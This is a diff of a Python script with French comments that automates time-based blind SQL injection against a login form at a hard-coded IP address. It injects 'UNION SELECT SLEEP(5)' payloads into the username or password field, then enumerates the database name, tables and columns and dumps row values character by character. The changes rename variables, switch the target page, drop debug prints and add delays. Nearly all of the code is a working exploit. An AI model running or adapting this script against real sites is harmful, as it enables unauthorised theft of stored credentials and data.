@@ -6,10 +6,10 @@ def db_name():
     usr = "idc"
     global dictionary
     dictionary = ["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","-"]
-    global table 
-    table = ""
+    global nbr 
+    nbr = ""
     global url
-    url = "http://51.15.136.118/login_sqlmap.php"
+    url = "http://51.15.136.118/login.php"
     # sert à déterminer si c'est username qui est vulnérable ou password
     global vulnerable_input
     vulnerable_input = True
@@ -24,18 +24,17 @@ def db_name():
         for num in range(1, 10):
             nums = ",{}".format(",".join([str(i) for i in range(1, num + 1)]))
             payload = "' UNION SELECT SLEEP(5)" + nums + "" + " where database() like '" + letter + "%' -- "
-            print(payload)
             start_time = time.time()
             response = requests.post(url, data={'username': usr, 'password': payload})
             end_time = time.time()
             total_time = end_time - start_time
             if total_time >= TIME:
-                table = nums
+                nbr = nums
                 break
         if total_time >= TIME:
             break 
     # Si le payload dans le champ password ne fonctionne pas, tester sur le champ username pour savoir si il est vulnérable
-    if table == "":
+    if nbr == "":
         for letter in dictionary:
             for num in range(1, 10):
                 nums = ",{}".format(",".join([str(i) for i in range(1, num + 1)]))
@@ -45,24 +44,23 @@ def db_name():
                 end_time = time.time()
                 total_time = end_time - start_time
                 if total_time >= TIME:
-                    table = nums
+                    nbr = nums
                     break
             if total_time >= TIME:
                 break 
 
-        if table != "":
+        if nbr != "":
             vulnerable_input = False
             print(vulnerable_input)
 
-    if table == "":
+    if nbr == "":
         print("Pas de base de données trouvées")
         exit()
 
     # Cherche le nom de la base de données que le formulaire de connexion utilise
     for i in range(1, 20):
         for j in range(0, len(dictionary)):
-            payload = "' UNION SELECT SLEEP(5)" + table + " where database() like '" + texte + dictionary[j] + "%' -- "
-            print(payload)
+            payload = "' UNION SELECT SLEEP(5)" + nbr + " where database() like '" + texte + dictionary[j] + "%' -- "
             start_time = time.time()
             if vulnerable_input == False:   
                 response = requests.post(url, data={'username': payload, 'password': usr})
@@ -94,6 +92,7 @@ def db_name():
     c = int(input("Choisissez le numéro correspondant au nom de la base de donnée sur laquelle vous voulez continué : "))
 
     print("Vous avez choisi {}. ".format(db[c-1]))
+    time.sleep(5)
     final_db=""
     jsp = final_db + "".join(db[c-1])
     return jsp
@@ -119,9 +118,8 @@ def table_name(database):
                     break
                 else:
                     break
-            payload = "' UNION SELECT SLEEP(5)" + table + " TABLE_NAME FROM information_schema.tables WHERE table_schema='" + database + "' AND TABLE_NAME like '" + texte + dictionary[j] + "%' -- "
-            """print(payload)"""
-            
+            payload = "' UNION SELECT SLEEP(5)" + nbr + " TABLE_NAME FROM information_schema.tables WHERE table_schema='" + database + "' AND TABLE_NAME like '" + texte + dictionary[j] + "%' -- "
+                      
             # Mesure le temps de la réponse du site web avec le temps donné dans la requête
             start_time = time.time()
             if vulnerable_input == False:   
@@ -147,6 +145,7 @@ def table_name(database):
     
     c = int(input("Choisissez le numéro correspondant au nom de la table sur laquelle vous voulez continuer : "))
     print("Vous avez choisi la table {}. ".format(tables_name[c-1]))
+    time.sleep(5)
     
     
     final_db = ""
@@ -179,8 +178,7 @@ def column_name(database, nom_table):
                     break
             
             # Requête SQL pour récupérer les noms de colonnes de la table cible
-            payload = "' UNION SELECT SLEEP(5)" + table + " COLUMN_NAME FROM information_schema.columns WHERE table_schema='" + database + "' AND TABLE_NAME='" + nom_table + "' AND COLUMN_NAME like '" + texte + dictionary[j] + "%' -- "
-            """print(payload)"""
+            payload = "' UNION SELECT SLEEP(5)" + nbr + " COLUMN_NAME FROM information_schema.columns WHERE table_schema='" + database + "' AND TABLE_NAME='" + nom_table + "' AND COLUMN_NAME like '" + texte + dictionary[j] + "%' -- "
             
             # Envoi de la requête et mesure du temps de réponse
             start_time = time.time()
@@ -207,6 +205,7 @@ def column_name(database, nom_table):
     for x in columns_name:
         b += 1
         print("Table {} : {} ".format(b, x))
+        time.sleep(5)
     
     return columns_name
 
@@ -216,7 +215,6 @@ def trouver_tab0(nom_table):
     tab = columns_name
     texte = ""
     TIME = 5
-    table = ",1,2"
     a = 0
     idk = []
     for i in range(1, 10):
@@ -226,15 +224,14 @@ def trouver_tab0(nom_table):
                     # On retire le premier caractère de la chaîne
                     rm_letter = texte[0]
                     dictionary.remove(rm_letter)
-                    idk.append(texte)
-                    print(idk)
+                    idk.append(texte)                   
                     a=0
                     texte = ""
                     break
             # Mesure du temps d'exécution de la requête
             start_time = time.time()
             # Création de la requête SQL injectée avec le nom de table, le nom de colonne et les caractères testés
-            payload = "' UNION SELECT SLEEP(5)" + table + " "" " + tab[0] + " FROM " + nom_table + " WHERE " + tab[0] + " like '" + texte + dictionary[j] + "%' -- "
+            payload = "' UNION SELECT SLEEP(5)" + nbr + " "" " + tab[0] + " FROM " + nom_table + " WHERE " + tab[0] + " like '" + texte + dictionary[j] + "%' -- "
             if vulnerable_input == False:   
                 response = requests.post(url, data={'username': payload, 'password': usr})
             else:
@@ -243,23 +240,21 @@ def trouver_tab0(nom_table):
             total_time = end_time - start_time
             if total_time >= TIME:
                 texte += dictionary[j]
+                # Affichage des noms de tab[0] trouvés
                 print(texte)
                 a=0
             
             a +=1
-    # Affichage de la liste de noms de colonnes trouvés
-    print(idk)
     # Retourne la liste de noms de colonnes trouvés
     return idk
 
 
-def dump_columns(table, tab0, column_name):
+def dump_columns(nom, tab0, column_name):
     dictionary = ["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","-"]
     tab = column_name
     nom_colonne = tab0
     texte = ""
     TIME = 5
-    table = ",1,2"
     a = 0
     z=0
     # Initialisation d'une liste vide pour stocker les résultats
@@ -302,8 +297,7 @@ def dump_columns(table, tab0, column_name):
 
                     start_time = time.time()
                     # Requête SQL injectée pour récupérer les données
-                    payload = "' UNION SELECT SLEEP(5)" + table + " "" " + tab[0] + " FROM users WHERE " + tab[0] + " = " + str(x) + " and " + tab[z] + " like '" + texte + dictionary[j] + "%' -- "
-                    print(payload)
+                    payload = "' UNION SELECT SLEEP(5)" + nbr + " "" " + tab[0] + " FROM " + nom + " WHERE " + tab[0] + " = " + str(x) + " and " + tab[z] + " like '" + texte + dictionary[j] + "%' -- "
                     # Envoi de la requête HTTP
                     if vulnerable_input == False:   
                         response = requests.post(url, data={'username': payload, 'password': usr})
